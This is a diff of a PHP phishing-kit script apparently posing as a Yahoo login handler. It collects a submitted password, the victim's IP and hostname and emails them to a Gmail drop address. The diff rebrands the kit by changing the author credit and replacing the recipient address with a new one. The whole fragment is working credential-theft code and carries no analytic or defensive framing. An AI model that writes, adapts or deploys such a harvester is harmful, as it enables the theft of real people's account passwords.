@@ -9,9 +9,9 @@ $message .= "PAss: ".$_POST['pass']."\n";
 $message .= "===================+By tare_ama +===========\n";
 $message .= "Client IP : ".$ip."\n";
 $message .= "HostName : ".$hostname."\n";
-$message .= "=============+ Created in 2020 By tare_ama +=============\n";
+$message .= "=============+ create in 2021 by zainab ali  +=============\n";
 $rnessage = "$message\n";
-$send= "nouman.sa33d@gmail.com";
+$send= "zaynabalihadi@gmail.com";
 $subject = "yahoo | Login | $ip";
 $headers = "From: pentest";
 
